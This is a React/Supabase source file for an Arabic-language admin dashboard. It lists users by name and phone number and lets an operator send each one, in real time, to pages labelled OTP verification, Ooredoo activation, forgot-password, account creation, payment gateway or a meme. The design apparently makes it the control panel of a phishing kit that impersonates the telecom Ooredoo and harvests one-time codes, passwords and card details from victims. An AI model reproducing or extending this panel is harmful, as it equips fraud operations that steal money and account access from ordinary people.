import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

interface ProcessingUser {
  id: string;
  user_id: string;
  name: string;
  phone: string;
  created_at: string;
}

const AdminDashboard = () => {
  const [users, setUsers] = useState<ProcessingUser[]>([]);
  const [selectedRoutes, setSelectedRoutes] = useState<{ [key: string]: string }>({});
  const navigate = useNavigate();

  useEffect(() => {
    // Load users from database
    const loadUsers = async () => {
      const { data, error } = await supabase
        .from("processing_users")
        .select("*")
        .order("created_at", { ascending: false });

      if (error) {
        console.error("Error loading users:", error);
        return;
      }

      if (data) {
        setUsers(data);
      }
    };

    loadUsers();

    // Subscribe to realtime changes
    const channel = supabase
      .channel("processing_users_changes")
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "processing_users",
        },
        () => {
          loadUsers();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const handleRouteSelect = (userId: string, route: string) => {
    setSelectedRoutes(prev => ({ ...prev, [userId]: route }));
  };

  const handleNavigateUser = async (userId: string, userName: string) => {
    const route = selectedRoutes[userId];
    if (!route) {
      toast.error("يرجى اختيار الصفحة المراد التوجيه إليها");
      return;
    }

    // Store the navigation instruction in database
    const { error } = await supabase
      .from("navigation_instructions")
      .upsert({ user_id: userId, route }, { onConflict: "user_id" });

    if (error) {
      console.error("Error setting navigation:", error);
      toast.error("حدث خطأ أثناء التوجيه");
      return;
    }

    toast.success(`تم إرسال أمر التوجيه للمستخدم ${userName}`);
  };

  const handleRemoveUser = async (userId: string) => {
    // Delete user from database
    const { error: userError } = await supabase
      .from("processing_users")
      .delete()
      .eq("user_id", userId);

    if (userError) {
      console.error("Error removing user:", userError);
      toast.error("حدث خطأ أثناء الحذف");
      return;
    }

    // Also remove navigation instruction if exists
    await supabase
      .from("navigation_instructions")
      .delete()
      .eq("user_id", userId);

    toast.success("تم حذف المستخدم");
  };

  const handleRemoveAllUsers = async () => {
    const confirmed = window.confirm(
      `هل أنت متأكد من حذف جميع المستخدمين؟ (${users.length} مستخدم)\nهذا الإجراء لا يمكن التراجع عنه.`
    );
    
    if (!confirmed) return;

    try {
      // Delete all users from database
      const { error: usersError } = await supabase
        .from("processing_users")
        .delete()
        .neq("id", "00000000-0000-0000-0000-000000000000"); // Delete all rows

      if (usersError) {
        console.error("Error removing users:", usersError);
        toast.error("حدث خطأ أثناء حذف المستخدمين");
        return;
      }

      // Delete all navigation instructions
      await supabase
        .from("navigation_instructions")
        .delete()
        .neq("id", "00000000-0000-0000-0000-000000000000"); // Delete all rows

      toast.success("تم حذف جميع المستخدمين بنجاح");
    } catch (error) {
      console.error("Error:", error);
      toast.error("حدث خطأ غير متوقع");
    }
  };

  const routes = [
    { value: "/otp-verification", label: "تحقق OTP" },
    { value: "/ooredoo-verification", label: "تفعيل Ooredoo" },
    { value: "/forgot-password", label: "نسيت كلمة المرور" },
    { value: "/account-creation", label: "إنشاء حساب" },
    { value: "/registration-complete", label: "بوابة الدفع 💳" },
    { value: "/meme", label: "صورة ميم 😂" },
    { value: "/success", label: "النجاح" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="mb-8 flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">لوحة تحكم الأدمن</h1>
            <p className="text-gray-600">إدارة المستخدمين في صفحة المعالجة</p>
          </div>
          {users.length > 0 && (
            <Button
              variant="destructive"
              onClick={handleRemoveAllUsers}
              className="gap-2"
            >
              🗑️ حذف الجميع ({users.length})
            </Button>
          )}
        </div>

        {users.length === 0 ? (
          <Card className="border-2 border-dashed">
            <CardContent className="flex flex-col items-center justify-center py-12">
              <div className="text-gray-400 text-6xl mb-4">👥</div>
              <p className="text-gray-500 text-lg">لا يوجد مستخدمين حالياً في صفحة المعالجة</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {users.map((user) => (
              <Card key={user.id} className="shadow-sm hover:shadow-md transition-shadow">
                <CardHeader className="pb-3">
                  <CardTitle className="text-lg flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                        <span className="text-primary font-bold">{user.name.charAt(0)}</span>
                      </div>
                      <div>
                        <div className="font-semibold text-gray-900">{user.name}</div>
                        <div className="text-sm text-gray-500 font-normal">{user.phone}</div>
                      </div>
                    </div>
                     <div className="text-xs text-gray-400 font-normal">
                      {new Date(user.created_at).toLocaleTimeString('ar-QA')}
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex gap-3">
                    <Select
                      value={selectedRoutes[user.user_id] || ""}
                      onValueChange={(value) => handleRouteSelect(user.user_id, value)}
                    >
                      <SelectTrigger className="flex-1">
                        <SelectValue placeholder="اختر الصفحة" />
                      </SelectTrigger>
                      <SelectContent>
                        {routes.map((route) => (
                          <SelectItem key={route.value} value={route.value}>
                            {route.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <Button
                      onClick={() => handleNavigateUser(user.user_id, user.name)}
                      disabled={!selectedRoutes[user.user_id]}
                      className="bg-primary hover:bg-primary/90"
                    >
                      توجيه
                    </Button>
                    <Button
                      variant="destructive"
                      onClick={() => handleRemoveUser(user.user_id)}
                    >
                      حذف
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </main>

      <Footer />
    </div>
  );
};

export default AdminDashboard;
